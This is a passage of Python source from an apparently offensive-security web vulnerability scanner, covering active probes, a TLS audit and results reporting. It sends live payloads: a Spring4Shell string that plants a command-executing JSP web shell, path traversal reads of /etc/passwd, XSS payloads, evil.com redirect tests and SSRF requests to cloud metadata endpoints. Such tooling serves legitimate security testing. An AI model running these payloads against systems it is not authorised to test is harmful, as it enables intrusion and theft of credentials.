            if resp and resp["status"] in (500, 502, 503):
                if not hinted:
                    warn(f"Log4Shell: server returned {resp['status']} with JNDI payload in {hdr} — possible hit")
                    hinted = True
                    findings.append({
                        "cve": "CVE-2021-44228", "severity": "CRITICAL", "cvss": 10.0,
                        "name": "Log4Shell JNDI Injection — Error Response (Possible)",
                        "desc": f"Header {hdr!r} with JNDI payload caused HTTP {resp['status']} — may indicate Log4j parsing.",
                    })


def _probe_spring4shell(host, port, tls, findings: list):
    """Check for Spring4Shell (CVE-2022-22965) via class param binding."""
    section("Spring4Shell (CVE-2022-22965) Active Probe")
    payload = (
        "class.module.classLoader.resources.context.parent.pipeline"
        ".first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))"
        "%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter"
        "(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20"
        "byte%5B2048%5D%3B%20while((-1!%3D(a%3Din.read(b)))%26%26response.getWriter().write(new"
        "%20String(b%2C0%2Ca)))%3B%20%7D%25%7Bsuffix%7Di&suffix=.jsp&c1=Runtime&c2=%3C%25&dnsSuffix="
    )
    resp = _req(host, port, tls, f"/?{payload}", timeout=8)
    if resp and resp["status"] in (200, 400):
        body = _body_str(resp)
        if "classloader" in body or "class.module" in body or "typemismatch" in body.lower():
            warn("Spring4Shell param binding response — target may be vulnerable")
            findings.append({
                "cve": "CVE-2022-22965", "severity": "CRITICAL", "cvss": 9.8,
                "name": "Spring4Shell — ClassLoader Manipulation (Potential)",
                "desc": "Server responded to class.module.classLoader binding — Tomcat+Spring deployment possible.",
            })


def _probe_path_traversal(host, port, tls, findings: list):
    """Test path traversal via URL params and direct paths."""
    section("Path Traversal (Active)")
    payloads = [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd%00",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ]
    params = ["file", "page", "path", "include", "doc", "template", "load", "read", "dir"]
    for param in params[:5]:
        for pl in payloads[:3]:
            resp = _req(host, port, tls, f"/?{param}={quote_plus(pl)}", timeout=6)
            if not resp:
                continue
            body = _body_str(resp)
            if "root:x:0:0" in body or "root:*:" in body or "[extensions]" in body:
                found(f"PATH TRAVERSAL via param '{param}'", f"payload: {pl[:50]}")
                findings.append({
                    "cve": "CWE-22-PATH-TRAVERSAL", "severity": "CRITICAL", "cvss": 9.1,
                    "name": "Path Traversal — /etc/passwd Read Confirmed",
                    "desc": f"Parameter ?{param}={pl} returned /etc/passwd content.",
                })
                return


def _probe_open_redirect(host, port, tls, findings: list):
    """Test open redirect parameters."""
    section("Open Redirect")
    params  = ["redirect", "url", "next", "return", "returnTo", "goto", "dest", "destination", "redir"]
    targets = ["https://evil.com", "//evil.com", "\\\\evil.com"]
    for param in params[:5]:
        for target in targets[:2]:
            resp = _req(host, port, tls, f"/?{param}={quote_plus(target)}", timeout=6)
            if not resp:
                continue
            loc = resp["headers"].get("location", "")
            if "evil.com" in loc:
                found(f"Open Redirect via ?{param}=", loc)
                findings.append({
                    "cve": "CWE-601-OPEN-REDIRECT", "severity": "MEDIUM", "cvss": 6.1,
                    "name": f"Open Redirect via ?{param}",
                    "desc": f"Location header redirects to {loc}.",
                })
                return


def _probe_reflected_xss(host, port, tls, findings: list):
    """Quick reflected XSS probe."""
    section("Reflected XSS")
    xss_payloads = [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><svg/onload=alert(1)>",
    ]
    params = ["q", "search", "s", "query", "id", "name", "input", "term"]
    for param in params[:5]:
        for pl in xss_payloads:
            resp = _req(host, port, tls, f"/?{param}={quote_plus(pl)}", timeout=6)
            if not resp:
                continue
            body = resp["body"][:8192].decode("utf-8", "replace")
            if pl in body:
                found(f"Reflected XSS via ?{param}", pl[:60])
                findings.append({
                    "cve": "CWE-79-XSS", "severity": "MEDIUM", "cvss": 6.1,
                    "name": f"Reflected XSS — ?{param}",
                    "desc": f"Payload {pl!r} reflected unescaped in response body.",
                })
                return


def _probe_ssrf_internal(host, port, tls, findings: list):
    """Probe URL params for SSRF to internal services."""
    section("SSRF Internal Probe")
    targets_ssrf = [
        ("169.254.169.254", "/latest/meta-data/", "AWS metadata"),
        ("169.254.169.254", "/computeMetadata/v1/", "GCP metadata"),
        ("127.0.0.1",       "/",                   "localhost"),
    ]
    params = ["url", "uri", "endpoint", "host", "dest", "proxy", "redirect", "fetch", "load"]
    for param in params[:4]:
        for ip, path, label in targets_ssrf[:2]:
            pl = f"http://{ip}{path}"
            resp = _req(host, port, tls, f"/?{param}={quote_plus(pl)}", timeout=6)
            if not resp:
                continue
            body = _body_str(resp)
            if any(k in body for k in ("ami-id", "computemetadata", "instance-id", "meta-data")):
                found(f"SSRF confirmed → {label}", f"param={param} → {pl}")
                findings.append({
                    "cve": "CWE-918-SSRF", "severity": "CRITICAL", "cvss": 9.0,
                    "name": f"SSRF — Fetched {label}",
                    "desc": f"Parameter ?{param} fetched {pl} and returned cloud metadata.",
                })
                return


# ============================================================================
# PHASE 3 — TLS/SSL DEEP AUDIT
# ============================================================================

def _probe_ssl_deep(host, port, findings: list):
    """Deep TLS protocol, cipher, and certificate audit."""
    section("TLS/SSL Deep Audit")

    # Protocol tests
    weak_protos = []
    proto_tests = [
        ("SSLv3",   ssl.PROTOCOL_TLS_CLIENT, ssl.TLSVersion.SSLv3  if hasattr(ssl.TLSVersion, "SSLv3")  else None),
        ("TLSv1.0", ssl.PROTOCOL_TLS_CLIENT, ssl.TLSVersion.TLSv1),
        ("TLSv1.1", ssl.PROTOCOL_TLS_CLIENT, ssl.TLSVersion.TLSv1_1),
    ]
    for name, proto, ver in proto_tests:
        if ver is None:
            continue
        try:
            ctx = ssl.SSLContext(proto)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ver
            ctx.maximum_version = ver
            with socket.create_connection((host, port), timeout=6) as s:
                with ctx.wrap_socket(s, server_hostname=host):
                    warn(f"{name} supported (deprecated protocol)")
                    weak_protos.append(name)
                    findings.append({
                        "cve": f"MISCONFIG-TLS-{name.replace('.', '').upper()}",
                        "severity": "HIGH" if "1" in name else "CRITICAL",
                        "cvss": 7.4 if "1" in name else 9.1,
                        "name": f"{name} Protocol Supported",
                        "desc": f"Server accepts {name} — vulnerable to downgrade attacks.",
                    })
        except Exception:
            fail(f"{name} not supported")

    # Certificate audit
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=8) as s:
            with ctx.wrap_socket(s, server_hostname=host) as ss:
                cert = ss.getpeercert()
                cipher = ss.cipher()
                proto  = ss.version()

        console.print(f"  [muted]Negotiated :[/muted] [text]{proto} / {cipher[0]}[/text]")

        # Weak ciphers
        if cipher and any(w in cipher[0] for w in ("RC4", "DES", "MD5", "EXPORT", "NULL", "ANON")):
            warn(f"Weak cipher suite: {cipher[0]}")
            findings.append({
                "cve": "MISCONFIG-TLS-WEAK-CIPHER", "severity": "HIGH", "cvss": 7.4,
                "name": f"Weak TLS Cipher: {cipher[0]}",
                "desc": f"Server negotiated {cipher[0]} — known weak algorithm.",
            })

        if cert:
            subj   = dict(x[0] for x in cert.get("subject", ()))
            issuer = dict(x[0] for x in cert.get("issuer", ()))
            san    = cert.get("subjectAltName", [])
            not_after = cert.get("notAfter", "")

            cn = subj.get("commonName", "?")
            console.print(f"  [muted]Subject CN  :[/muted] [text]{escape(cn)}[/text]")
            console.print(f"  [muted]Issuer     :[/muted] [text]{escape(issuer.get('organizationName', '?'))}[/text]")
            console.print(f"  [muted]SAN count  :[/muted] [text]{len(san)}[/text]")

            # Self-signed
            if subj == issuer:
                warn("Self-signed certificate")
                findings.append({
                    "cve": "MISCONFIG-TLS-SELF-SIGNED", "severity": "MEDIUM", "cvss": 5.9,
                    "name": "Self-Signed TLS Certificate",
                    "desc": "Certificate is self-signed — cannot be trusted by browsers.",
                })

            # Expiry
            if not_after:
                try:
                    exp = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                    exp = exp.replace(tzinfo=timezone.utc)
                    days = (exp - datetime.now(timezone.utc)).days
                    if days < 0:
                        warn(f"Certificate EXPIRED {abs(days)} days ago!")
                        findings.append({
                            "cve": "MISCONFIG-TLS-EXPIRED", "severity": "HIGH", "cvss": 7.5,
                            "name": f"TLS Certificate Expired ({abs(days)}d ago)",
                            "desc": f"Certificate expired on {not_after}.",
                        })
                    elif days < 30:
                        warn(f"Certificate expires in {days} days")
                        findings.append({
                            "cve": "MISCONFIG-TLS-EXPIRING", "severity": "MEDIUM", "cvss": 5.0,
                            "name": f"TLS Certificate Expiring in {days} Days",
                            "desc": f"Certificate will expire on {not_after}.",
                        })
                    else:
                        console.print(f"  [success]✓ Certificate valid for {days} days[/success]")
                except Exception:
                    pass

            # Hostname mismatch
            if cn and host.lower() not in cn.lower() and not any(host in v for _, v in san):
                warn(f"Hostname mismatch: {host!r} not in CN={cn!r}")
                findings.append({
                    "cve": "MISCONFIG-TLS-HOSTNAME-MISMATCH", "severity": "HIGH", "cvss": 6.8,
                    "name": "TLS Hostname Mismatch",
                    "desc": f"Certificate CN={cn!r} does not match host {host!r}.",
                })

    except Exception as e:
        warn(f"TLS deep audit error: {e}")


# ============================================================================
# CVE TABLE RENDERER
# ============================================================================

def _render_findings_table(host: str, service: str, port: int, findings: list):
    """Print a Rich table of all vulnerability findings."""
    color_map = {
        "CRITICAL": "bold red",
        "HIGH":     "red",
        "MEDIUM":   "yellow",
        "LOW":      "cyan",
        "INFO":     "dim",
    }

    table = Table(
        title=f"[bold]Deep Scan Results — {service.upper()} {host}:{port}[/bold]",
        show_lines=True,
    )
    table.add_column("SEV",     style="bold", width=10)
    table.add_column("CVSS",    style="primary", width=6)
    table.add_column("ID",      style="text", width=22)
    table.add_column("Finding", style="text", width=36)
    table.add_column("Summary", style="muted")

    # Sort: CRITICAL first
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    findings.sort(key=lambda f: sev_order.get(f.get("severity", "INFO"), 5))

    for f in findings:
        sev  = f.get("severity", "INFO")
        cvss = f.get("cvss", "?")
        cve  = f.get("cve", f.get("identifier", "?"))
        name = f.get("name", "?")
        desc = f.get("desc", f.get("description", ""))[:90]
        c    = color_map.get(sev, "white")
        table.add_row(
            f"[{c}]{sev}[/{c}]",
            str(cvss),
            cve,
            name,
            desc + ("…" if len(f.get("desc", f.get("description", ""))) > 90 else ""),
        )

    console.print(table)


# ============================================================================
# ENTRY POINT
# ============================================================================

def run(target: TargetInfo, config: AttackConfig) -> None:
    svc  = target.service.lower()
    tls  = svc == "https"
    is_web = svc in ("http", "https")

    console.print(
        f"\n[bold primary][ DEEP VULNERABILITY SCANNER ][/bold primary]\n"
        f"  [muted]Target  :[/muted] [primary]{svc.upper()} {target.host}:{target.port}[/primary]\n"
        f"  [muted]Version :[/muted] [text]{target.version or 'unknown'}[/text]\n"
        f"  [muted]Phases  :[/muted] [text]CVE DB → Active HTTP Probes"
        f"{' → TLS Audit' if is_web else ''}[/text]\n"
    )

    findings: list[dict] = []

    # ── Phase 1: CVE / version database ─────────────────────────────────────
    section("Phase 1 — CVE / Version Database")
    cves = CVE_DB.get(svc, [])
    matched = 0
    for item in cves:
        try:
            if item["condition"](target.version or ""):
                f_copy = {k: v for k, v in item.items() if k != "condition"}
                findings.append(f_copy)
                matched += 1
        except Exception:
            pass

    # FTP anonymous login from target.extra
    if svc == "ftp" and getattr(target, "extra", {}).get("anonymous_login") is True:
        findings.append({
            "cve": "MISCONFIG-FTP-ANON", "severity": "HIGH", "cvss": 7.5,
            "name": "Anonymous FTP Login Enabled",
            "desc": "Server accepts anonymous FTP logins without a password.",
        })
        matched += 1

    console.print(f"  [muted]CVE DB matched:[/muted] [{'success' if matched == 0 else 'warning'}]{matched} finding(s)[/{'success' if matched == 0 else 'warning'}]")

    # ── Phase 2: Active HTTP probes ──────────────────────────────────────────
    if is_web:
        section("Phase 2 — Active HTTP Probes")
        h, p = target.host, target.port

        _probe_server_fingerprint(h, p, tls, findings)
        _probe_security_headers(h, p, tls, findings)
        _probe_cors(h, p, tls, findings)
        _probe_http_methods(h, p, tls, findings)
        _probe_cookie_security(h, p, tls, findings)
        _probe_sensitive_paths(h, p, tls, findings)
        _probe_directory_listing(h, p, tls, findings)
        _probe_shellshock(h, p, tls, findings)
        _probe_log4shell(h, p, tls, findings)
        _probe_spring4shell(h, p, tls, findings)
        _probe_path_traversal(h, p, tls, findings)
        _probe_open_redirect(h, p, tls, findings)
        _probe_reflected_xss(h, p, tls, findings)
        _probe_ssrf_internal(h, p, tls, findings)

        # ── Phase 3: TLS deep audit ──────────────────────────────────────────
        section("Phase 3 — TLS/SSL Deep Audit")
        _probe_ssl_deep(h, p, findings)

    # ── Render consolidated results ──────────────────────────────────────────
    console.print()
    if not findings:
        console.print(
            f"  [bold success]✓ No vulnerabilities detected for {svc.upper()} "
            f"{target.host}:{target.port}[/bold success]\n"
        )
        return

    _render_findings_table(target.host, svc, target.port, findings)

    crits  = sum(1 for f in findings if f.get("severity") == "CRITICAL")
    highs  = sum(1 for f in findings if f.get("severity") == "HIGH")
    meds   = sum(1 for f in findings if f.get("severity") == "MEDIUM")
    lows   = sum(1 for f in findings if f.get("severity") == "LOW")

    console.print(
        f"\n  [bold error]{'★ CRITICAL: ' + str(crits) + '  ' if crits else ''}"
        f"[/bold error]"
        f"[red]HIGH: {highs}  [/red]"
        f"[yellow]MEDIUM: {meds}  [/yellow]"
        f"[cyan]LOW: {lows}[/cyan]"
        f"  [muted]│ Total: {len(findings)}[/muted]\n"
    )

    # ── Log to file ──────────────────────────────────────────────────────────
    if config.log_file:
        try:
            with open(config.log_file, "a", encoding="utf-8") as fh:
                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                fh.write(
                    f"\n--- [{ts}] DEEP VULN SCAN: {svc.upper()} "
                    f"{target.host}:{target.port} ({target.version}) ---\n"
                )
                for f in findings:
                    cve  = f.get("cve", f.get("identifier", "?"))
                    sev  = f.get("severity", "?")
                    name = f.get("name", "?")
                    desc = f.get("desc", f.get("description", ""))
                    fh.write(f"[{sev}] {cve} - {name}: {desc}\n")
            console.print(f"  [muted]Saved to:[/muted] [text]{config.log_file}[/text]")
        except OSError as e:
            console.print(f"  [warning]Could not write log: {e}[/warning]")

    # ── Save structured vuln report ──────────────────────────────────────────
    try:
        from modules.reporter import save_vuln_report
        norm = [{
            "severity":    f.get("severity", "?"),
            "name":        f.get("name", "?"),
            "identifier":  f.get("cve", f.get("identifier", "?")),
            "description": f.get("desc", f.get("description", "")),
        } for f in findings]
        rp = save_vuln_report(target.host, svc, target.port, norm)
        console.print(f"  [muted]Vuln report:[/muted] [text]{rp}[/text]")
    except Exception:
        pass
